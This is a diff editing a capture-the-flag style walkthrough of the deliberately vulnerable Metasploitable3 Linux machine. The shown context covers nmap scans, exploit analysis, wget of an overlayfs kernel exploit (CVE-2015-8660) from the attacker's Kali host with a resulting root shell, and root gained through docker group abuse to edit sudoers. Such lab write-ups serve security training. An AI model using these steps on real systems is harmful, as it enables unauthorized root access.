@@ -25,10 +25,10 @@ Metasploitable3 is a free vulnerable machine - either in a Linux or Windows vers
 
 ## Box Details
 
-IP Address: 192.168.4.132(Specific to my lab setup)
-OS: Linux, Ubuntu 14.04
-Hostname: metasploitable3-linux
-Kali: 192.168.4.129
+- IP Address: 192.168.4.132(Specific to my lab setup)
+- OS: Linux, Ubuntu 14.04
+- Hostname: metasploitable3-linux
+- Kali: 192.168.4.129
 
 ## Recon
 
@@ -55,7 +55,7 @@ MAC Address: 00:0C:29:BE:58:E2 (VMware)
 # Nmap done at Thu May  2 04:40:04 2019 -- 1 IP address (1 host up) scanned in 13.47 seconds
 ```
 
-Performing a nmap scan on the identified opened ports
+Performing a nmap service and version scan on the identified opened ports using default scripts
 
 ```
 # nmap -sC -sV -p 21,22,80,445,631,3000,3306,3500,6697,8181 -oA nmap/services 192.168.4.132
@@ -167,9 +167,9 @@ def exploit
         end
 ```
 
-From the function, it looks like the exploit is to connect and then send "AB;" + the payload + "\n"
+From the function, it looks like the exploit is to connect to the port and then send "AB;" + the payload + "\n"
 
-Examining the perl script the same way, `searchsploit -x exploits/linux/remote/13853.pl`, we can the following at the top section
+Examining the perl script the same way, `searchsploit -x exploits/linux/remote/13853.pl`, we can find the following at the top section
 
 ```perl
 ## Payload options
@@ -291,7 +291,7 @@ Saving to: ‘linux-exploit-suggester-2.pl’
 boba_fett@metasploitable3-ub1404:~$
 ```
 
-After running the enumeration scripts, are few things popped out for me:
+After running the enumeration scripts, a few things popped out for me:
 
 ##### Kernel Exploits - There were some kernel exploits available for this kernel version
 
@@ -336,7 +336,7 @@ docker
 
 ### Gaining root using the kernel exploit overlays(CVE-2015-8660)
 
-We can go ahead and download the overlayfs exploit from [here](http://www.exploit-db.com/exploits/39230), send it over to the victim machine and then compile the script to an executable and run it so as to gain the root shell:
+We can go ahead and download the overlayfs exploit from [here](http://www.exploit-db.com/exploits/39230), send it over to the victim machine and then use gcc to compile the script to an executable and execute it so as to gain the root shell:
 
 ```
 boba_fett@metasploitable3-ub1404:~$ wget http://192.168.4.129/overlay.c
@@ -372,7 +372,7 @@ uid=0(root) gid=0(root) groups=0(root),100(users),999(docker)
 
 ### Gaining root taking advantage to the docker group
 
-With user boba_fett in the docker group, we can issue docker commands without any restrictions. I will use docker command `docker images` to list the docker images on the system
+With user `boba_fett` in the docker group, we can issue docker commands without any restrictions. I will use docker command `docker images` to list the docker images on the system
 
 ```
 boba_fett@metasploitable3-ub1404:~$ docker images
@@ -398,7 +398,7 @@ boba_fett@metasploitable3-ub1404:~$
 
 ```
 
-We have our ubuntu container with id `5918a86e9463` running. Next step is to connect to our docker container, edit the suders file and insert details for boba_fett to be able to issue commands with sudo without entering his password(which we don't know). 
+We have our ubuntu container with id `5918a86e9463` running. Next step is to connect to our docker container, edit the `sudoers` file and insert details for `boba_fett` to be able to issue commands with sudo without entering his password(which we don't know).
 
 ```
 boba_fett@metasploitable3-ub1404:~$ docker exec -it 5918a86e9463 /bin/bash
@@ -409,7 +409,7 @@ root@5918a86e9463:/# pwd
 root@5918a86e9463:/# cd /root
 root@5918a86e9463:~# cat passwd | grep boba_fett
 boba_fett:x:1121:100::/home/boba_fett:/bin/bash
-root@5918a86e9463:~# 
+root@5918a86e9463:~#
 ```
 
 From the printout above, it's clear we have root access in the docker container and have successfully mounted the `/etc/` directory in the `root` directory. A simple grep on the `passwd` file, we found our user's name. 
